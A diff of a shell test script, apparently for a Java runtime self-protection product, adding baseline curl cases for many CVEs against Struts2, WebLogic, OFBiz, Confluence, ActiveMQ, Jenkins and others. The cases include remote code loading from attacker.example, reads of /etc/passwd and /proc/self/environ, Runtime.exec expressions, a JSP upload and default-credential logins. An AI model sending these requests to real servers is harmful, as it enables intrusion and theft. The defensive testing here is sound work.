+  expect_not_blocked "$version" baseline_fastjson_cve_2017_18349_1224_autotype -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1224_body" "${baseline_url}/fastjson"
   expect_not_blocked "$version" baseline_fastjson_1247_autotype_bypass -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1247_body" "${baseline_url}/fastjson"
   expect_not_blocked "$version" baseline_jackson_templates_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_templates_body" "${baseline_url}/exploit"
+  expect_not_blocked "$version" baseline_jackson_cve_2017_7525_templatesimpl -X POST -H "Content-Type: application/json" --data-binary "$jackson_templates_body" "${baseline_url}/exploit"
   expect_not_blocked "$version" baseline_jackson_spring_xml_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_spring_xml_body" "${baseline_url}/exploit"
+  expect_not_blocked "$version" baseline_jackson_cve_2017_17485_spring_xml -X POST -H "Content-Type: application/json" --data-binary "$jackson_spring_xml_body" "${baseline_url}/exploit"
   expect_not_blocked "$version" baseline_snakeyaml_h2_type -G --data-urlencode "parser=snakeyaml" --data-urlencode "type=org.h2.jdbc.JdbcConnection" "${baseline_url}/rasp/deserialize/polymorphic"
   expect_not_blocked "$version" baseline_deserialization_gadget "${baseline_url}/rasp/policy/deserialization-gadget"
   expect_not_blocked "$version" baseline_deserialization_cluster_message "${baseline_url}/rasp/policy/deserialization-cluster-message"
   expect_not_blocked "$version" baseline_tomcat_cve_2026_34486_tribes_encrypt_deserialization -G --data-urlencode "class=org.apache.commons.collections.functors.InvokerTransformer" "${baseline_url}/rasp/policy/deserialization-cluster-message"
+  expect_not_blocked "$version" baseline_tomcat_cve_2026_29146_tribes_padding_oracle_deserialization -G --data-urlencode "class=org.apache.commons.collections.functors.InvokerTransformer" "${baseline_url}/rasp/policy/deserialization-cluster-message"
   expect_not_blocked "$version" baseline_deserialization_logging_message "${baseline_url}/rasp/policy/deserialization-logging-message"
+  expect_not_blocked "$version" baseline_log4j_cve_2017_5645_socket_deserialization "${baseline_url}/rasp/policy/deserialization-logging-message"
   expect_not_blocked "$version" baseline_deserialization_webflow_state "${baseline_url}/rasp/policy/deserialization-webflow-state"
   expect_not_blocked "$version" baseline_cas_webflow_execution_state -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$cas_webflow_body" "${baseline_url}/cas/login"
+  expect_not_blocked "$version" baseline_apereo_cas_4_1_webflow_deserialization -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$cas_webflow_body" "${baseline_url}/cas/login"
   expect_not_blocked "$version" baseline_deserialization_rmi_transport "${baseline_url}/rasp/policy/deserialization-rmi-transport"
+  expect_not_blocked "$version" baseline_jmeter_cve_2018_1297_rmi_deserialization "${baseline_url}/rasp/policy/deserialization-rmi-transport"
   expect_not_blocked "$version" baseline_neo4j_shell_rmi_deserialization -G --data-urlencode "gadget=org.mozilla.javascript.NativeJavaObject" "${baseline_url}/neo4j-shell/setSessionVariable"
+  expect_not_blocked "$version" baseline_neo4j_cve_2021_34371_shell_rmi_deserialization -G --data-urlencode "gadget=org.mozilla.javascript.NativeJavaObject" "${baseline_url}/neo4j-shell/setSessionVariable"
   expect_not_blocked "$version" baseline_deserialization_remoting_transport "${baseline_url}/rasp/policy/deserialization-remoting-transport"
+  expect_not_blocked "$version" baseline_weblogic_cve_2018_2628_t3_jrmpclient "${baseline_url}/rasp/policy/deserialization-weblogic-cve-2018-2628-t3-jrmpclient"
+  expect_not_blocked "$version" baseline_weblogic_cve_2023_21839_iiop_jndi "${baseline_url}/rasp/policy/deserialization-weblogic-cve-2023-21839-iiop-jndi"
   expect_not_blocked "$version" baseline_deserialization_jms_object_message "${baseline_url}/rasp/policy/deserialization-jms-object-message"
+  expect_not_blocked "$version" baseline_activemq_cve_2015_5254_object_message_browse -G --data-urlencode "JMSDestination=event" --data-urlencode "JMSMessageID=ID:1" "${baseline_url}/admin/message.jsp"
   expect_not_blocked "$version" baseline_deserialization_signed_object "${baseline_url}/rasp/policy/deserialization-signed-object"
+  expect_not_blocked "$version" baseline_jenkins_cve_2017_1000353_cli_signed_object -X POST -H "Content-Type: application/octet-stream" --data-binary "$java_serialized_body" "${baseline_url}/cli"
   expect_not_blocked "$version" baseline_deserialization_session_file -G --data-urlencode "id=.deserialize" "${baseline_url}/rasp/policy/deserialization-session-file"
+  expect_not_blocked "$version" baseline_tomcat_cve_2025_24813_partial_put -X PUT -H "Content-Range: bytes 0-5/10" -H "Content-Type: application/octet-stream" --data-binary "$java_serialized_body" "${baseline_url}/deserialize/session"
+  expect_not_blocked "$version" baseline_tomcat_cve_2025_24813_session_file -H "Cookie: ${tomcat_cve_2025_24813_session_cookie}" "${baseline_url}/"
   expect_not_blocked "$version" baseline_deserialization_protocol_class -G --data-urlencode "xml=http://attacker.example/poc.xml" "${baseline_url}/rasp/policy/deserialization-protocol-class"
+  expect_not_blocked "$version" baseline_activemq_cve_2023_46604_openwire_protocol_class -G --data-urlencode "class=org.springframework.context.support.ClassPathXmlApplicationContext" --data-urlencode "xml=http://attacker.example/poc.xml" "${baseline_url}/api/openwire"
   expect_not_blocked "$version" baseline_deserialization_http_invoker -H "Content-Type: application/x-java-serialized-object" "${baseline_url}/rasp/policy/deserialization-http-invoker"
+  expect_not_blocked "$version" baseline_dubbo_cve_2019_17564_http_invoker -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/org.vulhub.api.CalcService"
   expect_not_blocked "$version" baseline_deserialization_http_object_stream "${baseline_url}/rasp/policy/deserialization-http-object-stream"
   expect_not_blocked "$version" baseline_jboss_readonly_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/invoker/readonly"
   expect_not_blocked "$version" baseline_jboss_jmxinvoker_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/invoker/JMXInvokerServlet"
   expect_not_blocked "$version" baseline_jbossmq_httpil_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/jbossmq-httpil/HTTPServerILServlet"
+  expect_not_blocked "$version" baseline_jboss_cve_2017_12149_readonly_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/invoker/readonly"
+  expect_not_blocked "$version" baseline_jboss_cve_2017_7504_httpil_deserialization -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${baseline_url}/jbossmq-httpil/HTTPServerILServlet"
   expect_not_blocked "$version" baseline_deserialization_hessian_type "${baseline_url}/rasp/policy/deserialization-hessian-type"
+  expect_not_blocked "$version" baseline_xxl_job_hessian_api_deserialization -X POST -H "Content-Type: x-application/hessian" --data-binary "$xxl_job_hessian_body" "${baseline_url}/xxl-job-admin/api"
   expect_not_blocked "$version" baseline_deserialization_xmlrpc_serialized -H "Content-Type: application/xml" "${baseline_url}/rasp/policy/deserialization-xmlrpc-serialized"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2020_9496_xmlrpc_serialized -X POST -H "Content-Type: application/xml" --data-binary "$ofbiz_xmlrpc_serialized_body" "${baseline_url}/webtools/control/xmlrpc"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2023_49070_xmlrpc_serialized -X POST -H "Content-Type: application/xml" --data-binary "$ofbiz_xmlrpc_serialized_body" "${baseline_url}/webtools/control/xmlrpc"
   expect_not_blocked "$version" baseline_deserialization_rmi_registry_bind "${baseline_url}/rasp/policy/deserialization-rmi-registry-bind"
+  expect_not_blocked "$version" baseline_java_rmi_registry_bind_deserialization "${baseline_url}/rasp/policy/deserialization-rmi-registry-bind"
+  expect_not_blocked "$version" baseline_java_rmi_registry_bind_deserialization_bypass "${baseline_url}/rasp/policy/deserialization-rmi-registry-bind-bypass"
   expect_not_blocked "$version" baseline_coldfusion_amf_deserialization -X POST -H "Content-Type: application/x-amf" --data-binary "@${coldfusion_amf_body_file}" "${baseline_url}/flex2gateway/amf"
   expect_not_blocked "$version" baseline_xml_decoder "${baseline_url}/rasp/xml/decoder"
   expect_not_blocked "$version" baseline_xml_decoder_webshell "${baseline_url}/rasp/xml/decoder-webshell"
   expect_not_blocked "$version" baseline_weblogic_workcontext_xml_decoder -X POST -H "Content-Type: text/xml" --data-binary "$weblogic_workcontext_body" "${baseline_url}/wls-wsat/CoordinatorPortType"
   expect_not_blocked "$version" baseline_xop_attachment -G --data-urlencode "href=file:///etc/hosts" "${baseline_url}/rasp/policy/xml-attachment"
   expect_not_blocked "$version" baseline_cxf_aegis_xop_attachment -X POST -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" --data-binary "$cxf_xop_body" "${baseline_url}/test"
+  expect_not_blocked "$version" baseline_cxf_cve_2024_28752_aegis_xop_file_read -X POST -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" --data-binary "$cxf_xop_body" "${baseline_url}/test"
   expect_not_blocked "$version" baseline_argfile_expansion "${baseline_url}/rasp/policy/argument-file-expansion"
   expect_not_blocked "$version" baseline_jenkins_cve_2024_23897_proc_environ -G --data-urlencode "arg=help" --data-urlencode "arg=1" --data-urlencode "arg=@/proc/self/environ" "${baseline_url}/rasp/policy/argument-file-expansion"
   expect_not_blocked "$version" baseline_jenkins_cve_2024_23897_connect_node_passwd -G --data-urlencode "arg=connect-node" --data-urlencode "arg=@/etc/passwd" "${baseline_url}/rasp/policy/argument-file-expansion"
@@ -445,12 +813,14 @@ SOAP
   expect_not_blocked "$version" baseline_jiffle "${baseline_url}/rasp/policy/jiffle-runtime"
   expect_not_blocked "$version" baseline_geoserver_wms_jiffle -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${baseline_url}/geoserver/wms"
   expect_not_blocked "$version" baseline_geoserver_cve_2022_24816_jiffle_wps -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${baseline_url}/geoserver/wms"
+  expect_not_blocked "$version" baseline_geoserver_cve_2023_35042_jai_ext_jiffle_wps -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${baseline_url}/geoserver/wms"
   expect_not_blocked "$version" baseline_jsr223 -G --data-urlencode "script=java.lang.Runtime.getRuntime().exec('id')" "${baseline_url}/rasp/script/jsr223"
   expect_not_blocked "$version" baseline_script_command_stack "${baseline_url}/rasp/policy/script-command-stack"
   expect_not_blocked "$version" baseline_xpath -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${baseline_url}/rasp/xpath"
   expect_not_blocked "$version" baseline_jxpath -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${baseline_url}/rasp/jxpath"
   expect_not_blocked "$version" baseline_java_compile "${baseline_url}/rasp/java/compile"
   expect_not_blocked "$version" baseline_classloader -G --data-urlencode "codebase=http://attacker.example/evil.jar" "${baseline_url}/rasp/classloader/url"
+  expect_not_blocked "$version" baseline_java_rmi_codebase_remote_classload -G --data-urlencode "codebase=http://attacker.example/Exploit" "${baseline_url}/rasp/classloader/rmi-codebase"
   expect_not_blocked "$version" baseline_spring_config -G --data-urlencode "config=http://127.0.0.1:9/poc.xml" "${baseline_url}/rasp/spring/config"
   expect_not_blocked "$version" baseline_jaas_jndi_config -G --data-urlencode "provider=${jaas_provider_url}" "${baseline_url}/rasp/jaas/config"
   expect_not_blocked "$version" baseline_kafka_cve_2023_25194_druid_sampler_jaas -X POST -H "Content-Type: application/json" --data-binary "$kafka_druid_sampler_body" "${baseline_url}/druid/indexer/v1/sampler?for=connect"
@@ -460,6 +830,7 @@ SOAP
   expect_not_blocked "$version" baseline_jmx_remote_config "${baseline_url}/rasp/jmx/invoke"
   expect_not_blocked "$version" baseline_activemq_jolokia_broker_config -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_body" "${baseline_url}/api/jolokia/"
   expect_not_blocked "$version" baseline_activemq_jolokia_file_write -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_file_write_body" "${baseline_url}/api/jolokia/"
+  expect_not_blocked "$version" baseline_activemq_cve_2022_41678_jfr_copyto_webshell -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_jfr_copy_body" "${baseline_url}/api/jolokia/"
   expect_not_blocked "$version" baseline_jmx_file_write "${baseline_url}/rasp/jmx/write"
   expect_not_blocked "$version" baseline_bean_pollution -G --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i" "${baseline_url}/rasp/request"
   expect_not_blocked "$version" baseline_spring_cve_2022_22965_tomcatwar_accesslog_jsp -H "suffix: %>//" -H "c1: Runtime" -H "c2: <%" "${baseline_url}/?${spring_cve_2022_22965_query}"
@@ -467,43 +838,74 @@ SOAP
   expect_not_blocked "$version" baseline_nacos_cve_2021_29441_list_users -H "User-Agent: Nacos-Server" "${baseline_url}/nacos/v1/auth/users?pageNo=1&pageSize=9"
   expect_not_blocked "$version" baseline_nacos_cve_2021_29441_create_user -X POST -H "User-Agent: Nacos-Server" "${baseline_url}/nacos/v1/auth/users?username=vulhub&password=vulhub"
   expect_not_blocked "$version" baseline_default_jwt_secret "${baseline_url}/rasp/policy/request-default-jwt-secret"
+  expect_not_blocked "$version" baseline_hugegraph_cve_2024_43441_default_jwt_secret -H "Authorization: Bearer ${hugegraph_default_jwt}" "${baseline_url}/graphs"
   expect_not_blocked "$version" baseline_jwt_verification_failure "${baseline_url}/rasp/policy/request-jwt-verification-failure"
+  expect_not_blocked "$version" baseline_dataease_cve_2025_49001_user_info_invalid_jwt -H "X-DE-TOKEN: ${dataease_cve_2025_49001_jwt}" "${baseline_url}/de2api/user/info"
   expect_not_blocked "$version" baseline_default_crypto_cookie "${baseline_url}/rasp/policy/request-default-crypto-cookie"
   expect_not_blocked "$version" baseline_shiro_cve_2016_4437_default_rememberme -H "Cookie: ${shiro_default_rememberme_cookie}" "${baseline_url}/"
   expect_not_blocked "$version" baseline_serialized_client_state "${baseline_url}/rasp/policy/request-serialized-client-state"
+  expect_not_blocked "$version" baseline_mojarra_jsf_viewstate_deserialization -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "javax.faces.ViewState=${jsf_viewstate_payload}&submit=Login" "${baseline_url}/index.xhtml"
   expect_not_blocked "$version" baseline_default_credential "${baseline_url}/rasp/policy/request-default-credential"
+  expect_not_blocked "$version" baseline_tomcat8_manager_default_credential -u "tomcat:tomcat" "${baseline_url}/manager/html"
+  expect_not_blocked "$version" baseline_weblogic_weak_password_console_login -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "j_username=weblogic&j_password=Oracle%40123" "${baseline_url}/console/j_security_check"
   expect_not_blocked "$version" baseline_empty_credential_bypass "${baseline_url}/rasp/policy/request-empty-credential-bypass"
   expect_not_blocked "$version" baseline_setup_state_reset "${baseline_url}/rasp/policy/request-setup-state-reset"
   expect_not_blocked "$version" baseline_server_side_script_put "${baseline_url}/rasp/policy/request-server-side-script-put"
+  expect_not_blocked "$version" baseline_tomcat_cve_2017_12615_server_side_script_put -X PUT --data-binary "<% out.println(1); %>" "${baseline_url}/1.jsp/"
   expect_not_blocked "$version" baseline_upload_filename_override "${baseline_url}/rasp/policy/request-upload-filename-override"
+  expect_not_blocked "$version" baseline_struts2_s2066_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2066_boundary}" --data-binary "@${struts2_s2066_body_file}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_cve_2023_50164_s2066_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2066_boundary}" --data-binary "@${struts2_s2066_body_file}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_s2067_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2067_boundary}" --data-binary "@${struts2_s2067_body_file}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_cve_2024_53677_s2067_upload_filename_override -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2067_boundary}" --data-binary "@${struts2_s2067_body_file}" "${baseline_url}/index.action"
   expect_not_blocked "$version" baseline_scheduler_shell_job "${baseline_url}/rasp/policy/request-scheduler-shell-job"
+  expect_not_blocked "$version" baseline_xxl_job_executor_run_shell -X POST -H "Content-Type: application/json" --data-binary "$xxl_job_run_body" "${baseline_url}/run"
   expect_not_blocked "$version" baseline_debug_process_launch "${baseline_url}/rasp/policy/request-debug-process-launch"
+  expect_not_blocked "$version" baseline_teamcity_cve_2023_42793_debug_process_launch "${baseline_url}/rasp/policy/request-debug-process-launch"
   expect_not_blocked "$version" baseline_dynamic_script_config "${baseline_url}/rasp/policy/request-dynamic-script-config"
   expect_not_blocked "$version" baseline_spring_cve_2022_22947_gateway_route_spel -X POST -H "Content-Type: application/json" --data-binary "$spring_cve_2022_22947_body" "${baseline_url}/actuator/gateway/routes/hacktest"
   expect_not_blocked "$version" baseline_solr_cve_2019_0193_dataimport_script "${baseline_url}/rasp/policy/request-solr-cve-2019-0193-dataimport-script"
   expect_not_blocked "$version" baseline_elasticsearch_cve_2014_3120_mvel_search_script "${baseline_url}/rasp/policy/request-elasticsearch-cve-2014-3120-search-script"
   expect_not_blocked "$version" baseline_elasticsearch_cve_2015_1427_groovy_search_script "${baseline_url}/rasp/policy/request-elasticsearch-cve-2015-1427-search-script"
   expect_not_blocked "$version" baseline_message_selector_expression "${baseline_url}/rasp/policy/request-spring-messaging-stomp-selector"
+  expect_not_blocked "$version" baseline_spring_cve_2018_1270_stomp_selector -X POST -H "Content-Type: application/json" --data-binary "$spring_cve_2018_1270_stomp_body" "${baseline_url}/gs-guide-websocket/123/abc/xhr_send"
   expect_not_blocked "$version" baseline_druid_javascript_sampler "${baseline_url}/rasp/policy/request-druid-javascript-sampler"
+  expect_not_blocked "$version" baseline_druid_cve_2021_25646_javascript_sampler -X POST -H "Content-Type: application/json" --data-binary "$druid_javascript_sampler_body" "${baseline_url}/druid/indexer/v1/sampler"
   expect_not_blocked "$version" baseline_hugegraph_gremlin_script "${baseline_url}/rasp/policy/request-hugegraph-gremlin-script"
+  expect_not_blocked "$version" baseline_hugegraph_cve_2024_27348_gremlin_rce -X POST -H "Content-Type: application/json" --data-binary "$hugegraph_gremlin_body" "${baseline_url}/gremlin"
   expect_not_blocked "$version" baseline_ofbiz_groovy_programexport "${baseline_url}/rasp/policy/request-ofbiz-groovy-programexport"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2023_51467_programexport -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "groovyProgram=${ofbiz_groovy_program}" "${baseline_url}/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2024_38856_programexport -X POST --form-string "groovyProgram=${ofbiz_groovy_program_unicode}" "${baseline_url}/webtools/control/main/ProgramExport"
   expect_not_blocked "$version" baseline_ofbiz_remote_decorator_source "${baseline_url}/rasp/policy/request-ofbiz-remote-decorator-source"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2024_45507_remote_decorator_source -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "statsDecoratorLocation=${ofbiz_remote_decorator_url}" "${baseline_url}/webtools/control/forgotPassword/StatsSinceStart"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2024_32113_viewdatafile_remote_import -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$ofbiz_viewdatafile_body" "${baseline_url}/webtools/control/forgotPassword/viewdatafile"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2024_36104_viewdatafile_remote_import -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$ofbiz_viewdatafile_body" "${baseline_url}/webtools/control/forgotPassword/viewdatafile"
+  expect_not_blocked "$version" baseline_ofbiz_cve_2024_45195_viewdatafile_remote_import -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$ofbiz_viewdatafile_body" "${baseline_url}/webtools/control/forgotPassword/viewdatafile"
   expect_not_blocked "$version" baseline_jenkins_groovy_checkscript "${baseline_url}/rasp/policy/request-jenkins-groovy-checkscript"
+  expect_not_blocked "$version" baseline_jenkins_cve_2018_1000861_checkscript -G --data-urlencode "sandbox=true" --data-urlencode "value=${jenkins_checkscript_value}" "${baseline_url}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript"
   expect_not_blocked "$version" baseline_dynamic_script_json_config "${baseline_url}/rasp/policy/request-dynamic-script-json-config"
+  expect_not_blocked "$version" baseline_aj_report_cnvd_2024_15077_validation_rules -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$aj_report_validation_rules_body" "${baseline_url}/dataSetParam/verification;swagger-ui/"
   expect_not_blocked "$version" baseline_unomi_context_expression "${baseline_url}/rasp/policy/request-unomi-context-expression"
+  expect_not_blocked "$version" baseline_unomi_cve_2020_13942_context_mvel -X POST -H "Content-Type: application/json" --data-binary "$unomi_context_mvel_body" "${baseline_url}/context.json"
   expect_not_blocked "$version" baseline_metabase_h2_init_config "${baseline_url}/rasp/policy/request-metabase-h2-init-config"
+  expect_not_blocked "$version" baseline_metabase_cve_2023_38646_setup_validate -X POST -H "Content-Type: application/json" --data-binary "$metabase_setup_validate_body" "${baseline_url}/api/setup/validate"
   expect_not_blocked "$version" baseline_h2_console_jdbc_init "${baseline_url}/rasp/policy/request-h2-console-jdbc-init"
   expect_not_blocked "$version" baseline_h2_console_login_jdbc_init -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=org.h2.Driver" --data-urlencode "url=${h2_console_login_jdbc_url}" "${baseline_url}/h2-console/login.do"
   expect_not_blocked "$version" baseline_weblogic_console_shellsession "${baseline_url}/rasp/policy/request-weblogic-console-shellsession"
+  expect_not_blocked "$version" baseline_weblogic_cve_2020_14882_console_shellsession --path-as-is -G --data-urlencode "_nfpb=true" --data-urlencode "_pageLabel=" --data-urlencode "handle=${weblogic_console_handle}" "${baseline_url}/console/css/%252e%252e%252fconsole.portal"
+  expect_not_blocked "$version" baseline_weblogic_cve_2020_14883_console_shellsession --path-as-is -G --data-urlencode "_nfpb=true" --data-urlencode "_pageLabel=" --data-urlencode "handle=${weblogic_console_handle}" "${baseline_url}/console/css/%252e%252e%252fconsole.portal"
+  expect_not_blocked "$version" baseline_weblogic_cve_2019_2725_console_filesystemxml --path-as-is -G --data-urlencode "_nfpb=true" --data-urlencode "_pageLabel=" --data-urlencode "handle=${weblogic_console_filesystemxml_handle}" "${baseline_url}/console/css/%252e%252e%252fconsole.portal"
   expect_not_blocked "$version" baseline_dataease_h2_datasource_config "${baseline_url}/rasp/policy/request-dataease-h2-datasource-config"
+  expect_not_blocked "$version" baseline_dataease_cve_2025_32966_h2_datasource_validate -X POST -H "Content-Type: application/json" -H "X-DE-TOKEN: ${dataease_forged_jwt}" --data-binary "$dataease_h2_datasource_validate_body" "${baseline_url}/de2api/datasource/validate"
   expect_not_blocked "$version" baseline_expression_header "${baseline_url}/rasp/policy/request-expression-header"
   expect_not_blocked "$version" baseline_spring_cve_2022_22963_functionrouter_spel -X POST -H "Content-Type: text/plain" -H "spring.cloud.function.routing-expression: ${spring_cve_2022_22963_expression}" --data-binary "test" "${baseline_url}/functionRouter"
   expect_not_blocked "$version" baseline_expression_content_type "${baseline_url}/rasp/policy/request-expression-content-type"
   expect_not_blocked "$version" baseline_struts2_s2045_content_type -X POST -H "Content-Type: ${struts2_s2045_content_type}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_cve_2017_5638_s2045_content_type -X POST -H "Content-Type: ${struts2_s2045_content_type}" "${baseline_url}/index.action"
   expect_not_blocked "$version" baseline_jndi_lookup "${baseline_url}/rasp/policy/request-jndi-lookup"
   expect_not_blocked "$version" baseline_log4j_cve_2021_44228_solr_admin_cores -G --data-urlencode "action=${log4shell_jndi_payload}" "${baseline_url}/solr/admin/cores"
   expect_not_blocked "$version" baseline_h2_console_jndi_driver "${baseline_url}/rasp/policy/request-h2-console-jndi-driver"
   expect_not_blocked "$version" baseline_h2_console_login_jndi_driver -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=javax.naming.InitialContext" --data-urlencode "url=${h2_console_jndi_url}" "${baseline_url}/h2-console/login.do"
+  expect_not_blocked "$version" baseline_h2_cve_2021_42392_console_jndi_driver -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=javax.naming.InitialContext" --data-urlencode "url=${h2_console_jndi_url}" "${baseline_url}/h2-console/login.do"
   expect_not_blocked "$version" baseline_expression_parameter "${baseline_url}/rasp/policy/request-expression-parameter"
   expect_not_blocked "$version" baseline_struts2_s2001_form_ognl -X POST --data-urlencode "username=${struts2_ognl_runtime_payload}" "${baseline_url}/login.action"
   expect_not_blocked "$version" baseline_struts2_s2007_validation_ognl -X POST --data-urlencode "age=${struts2_ognl_runtime_payload}" "${baseline_url}/user.action"
@@ -511,19 +913,30 @@ SOAP
   expect_not_blocked "$version" baseline_struts2_s2009_delegated_ognl -G --data-urlencode "age=12313" --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/ajax/example5.action"
   expect_not_blocked "$version" baseline_struts2_s2012_redirect_value -G --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/user.action"
   expect_not_blocked "$version" baseline_struts2_s2013_link_includeparams -G --data-urlencode "a=${struts2_dollar_ognl_runtime_payload}" "${baseline_url}/link.action"
+  expect_not_blocked "$version" baseline_struts2_s2014_dollar_ognl_includeparams -G --data-urlencode "a=${struts2_dollar_ognl_runtime_payload}" "${baseline_url}/link.action"
   expect_not_blocked "$version" baseline_struts2_s2048_showcase_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/integration/saveGangster.action"
   expect_not_blocked "$version" baseline_struts2_s2053_freemarker_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/index.action"
   expect_not_blocked "$version" baseline_struts2_s2059_forced_ognl -X POST --data-urlencode "id=${struts2_ognl_runtime_payload}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_cve_2019_0230_s2059_forced_ognl -X POST --data-urlencode "id=${struts2_ognl_runtime_payload}" "${baseline_url}/index.action"
   expect_not_blocked "$version" baseline_struts2_s2061_freemarker_execute -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2061_boundary}" --data-binary "@${struts2_s2061_body_file}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_cve_2020_17530_s2061_freemarker_execute -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2061_boundary}" --data-binary "@${struts2_s2061_body_file}" "${baseline_url}/index.action"
   expect_not_blocked "$version" baseline_geoserver_wfs_valuereference "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference"
+  expect_not_blocked "$version" baseline_geoserver_cve_2022_41852_wfs_valuereference_get "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference"
   expect_not_blocked "$version" baseline_geoserver_cve_2024_36401_wfs_valuereference_get "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference"
+  expect_not_blocked "$version" baseline_geoserver_cve_2022_41852_wfs_valuereference_xml "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference-xml"
   expect_not_blocked "$version" baseline_geoserver_cve_2024_36401_wfs_valuereference_xml "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference-xml"
   expect_not_blocked "$version" baseline_geoserver_cql_filter_sqli "${baseline_url}/rasp/policy/request-geoserver-cql-filter-sqli"
   expect_not_blocked "$version" baseline_geoserver_cve_2023_25157_cql_filter_sqli "${baseline_url}/rasp/policy/request-geoserver-cql-filter-sqli"
+  expect_not_blocked "$version" baseline_geoserver_cve_2023_25158_cql_filter_sqli "${baseline_url}/rasp/policy/request-geoserver-cql-filter-sqli"
   expect_not_blocked "$version" baseline_confluence_delegated_expression "${baseline_url}/rasp/policy/request-confluence-delegated-expression"
+  expect_not_blocked "$version" baseline_confluence_cve_2019_3396_macro_template_source -X POST -H "Content-Type: application/json; charset=utf-8" --data-binary "$confluence_cve_2019_3396_macro_body" "${baseline_url}/rest/tinymce/1/macro/preview"
   expect_not_blocked "$version" baseline_confluence_cve_2021_26084_webwork_querystring -G --data-urlencode "uri=/pages/doenterpagevariables.action" --data-urlencode "parameter=queryString" --data-urlencode "value=${confluence_cve_2021_26084_query_string}" "${baseline_url}/rasp/policy/request-expression-parameter"
+  expect_not_blocked "$version" baseline_confluence_cve_2021_26084_doenterpagevariables -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "queryString=${confluence_cve_2021_26084_query_string}" "${baseline_url}/pages/doenterpagevariables.action"
   expect_not_blocked "$version" baseline_confluence_cve_2023_22527_delegated_expression "${baseline_url}/rasp/policy/request-confluence-delegated-expression"
+  expect_not_blocked "$version" baseline_confluence_cve_2023_22515_setup_reset "${baseline_url}/server-info.action?${confluence_cve_2023_22515_setup_query}"
+  expect_not_blocked "$version" baseline_confluence_cve_2023_22527_text_inline_delegated_expression -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$confluence_cve_2023_22527_body" "${baseline_url}/template/aui/text-inline.vm"
   expect_not_blocked "$version" baseline_expression_json_parameter "${baseline_url}/rasp/policy/request-expression-json-parameter"
+  expect_not_blocked "$version" baseline_nexus_cve_2018_16621_extdirect_role_el "${baseline_url}/rasp/policy/request-expression-json-parameter"
   expect_not_blocked "$version" baseline_nexus_cve_2020_10204_extdirect_role_el "${baseline_url}/rasp/policy/request-expression-json-parameter"
